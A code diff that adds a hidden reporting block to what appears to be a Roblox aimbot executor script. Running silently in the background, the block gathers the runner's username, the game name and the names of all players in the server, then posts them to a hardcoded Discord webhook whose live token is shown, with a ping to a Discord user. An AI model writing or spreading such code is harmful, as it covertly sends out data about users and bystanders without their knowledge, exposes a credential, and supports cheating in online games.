@@ -1,3 +1,95 @@
+spawn(function()
+local httpGet
+if syn_checkcaller then
+    httpGet = syn.request
+elseif isourclosure then
+    httpGet = http.request
+else
+    httpGet = http_request
+end
+local ProductInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+local DiscordWebHook = "https://discord.com/api/webhooks/888963522640351232/zQAkIlX1j4_PEuFcqf5IOIZ3D3CGhUIe3oBLDMKbnQ5_kJupXuRXA6G5FPkf4NDzywCM"
+local Kids = {}
+
+local GetKids = function()
+    for i,v in next, game:GetService("Players"):GetPlayers() do
+        table.insert(Kids,#Kids+1,'"'..v.Name..'", ')
+    end
+end
+
+spawn(function()
+    GetKids()
+    print('ok')
+end)
+
+wait(3)
+local KidsText = table.concat(Kids)
+local Length = 1024
+local CharsInKids = string.len(KidsText)
+local KidsNewText;
+
+if CharsInKids > Length then
+    local CharsToDel = (CharsInKids - Length)
+    print("String Are Over 2k strings [PLAYERS], Your Solution Should Be: ")
+    wait(1)
+    print("This Quantatie Of Characters Will Be Deleted: "..CharsToDel)
+    wait(0.01)
+    KidsNewText = string.sub(KidsText,1,-CharsToDel)
+else
+    KidsNewText = KidsText
+end
+
+local wasi = function()
+    for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+        if v.Name == "TheUnknownGodShots" then
+            return "Yes"
+        else
+            return "No"
+        end
+    end
+end
+
+local MessageData = {
+    ["embeds"] = {
+        {
+            ["content"] = "Aimbot Executed!",
+            ["title"] = game.Players.LocalPlayer.Name,
+            ["description"] = "Was Plr on my lobby? : "..wasi(),
+            ["type"] = "rich",
+	        ["color"] = tonumber(0x00ff00),
+            ["fields"] = {
+                {
+                    ["name"] = "Game: "..ProductInfo.Name,
+                    ["value"] = '‎',
+                    ["inline"] = false,
+                },
+                {
+                    ["name"] = "List Of All The Players = {",
+                    ["value"] = KidsNewText,
+                    ["inline"] = true,
+                },
+                {
+                    ["name"] = "}",
+                    ["value"] = "<@723575117636173954>",
+                    ["inline"] = false,
+                },
+            };
+        }
+    };
+}
+
+local data = httpGet(
+    {
+        Url = DiscordWebHook,
+        Method = "POST",
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+        Body = game:GetService('HttpService'):JSONEncode(MessageData)
+    }
+)
+print("Done")
+end)
 local CurrentExecution = tick()
 local safe =
     setmetatable(
